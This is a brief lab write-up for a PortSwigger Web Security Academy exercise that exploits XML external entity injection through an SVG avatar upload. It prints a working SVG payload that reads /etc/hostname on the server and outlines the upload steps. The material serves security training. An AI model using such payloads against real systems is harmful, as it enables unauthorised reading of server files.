# Lab: Exploiting XXE via image file upload

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

**Lab idea:** The application processes uploaded avatar images with a library that handles SVG, an XML-based image format. The challenge practices looking beyond ordinary XML requests and assessing how server-side file processing can expose an XXE attack surface.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Create a local SVG image with the following content: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px"…
2. Post a comment on a blog post, and upload this image as an avatar.
3. When you view your comment, you should see the contents of the /etc/hostname file in your image.

## Payloads / key values
- `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
- `/etc/hostname`

## Official source
- [PortSwigger Academy: Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
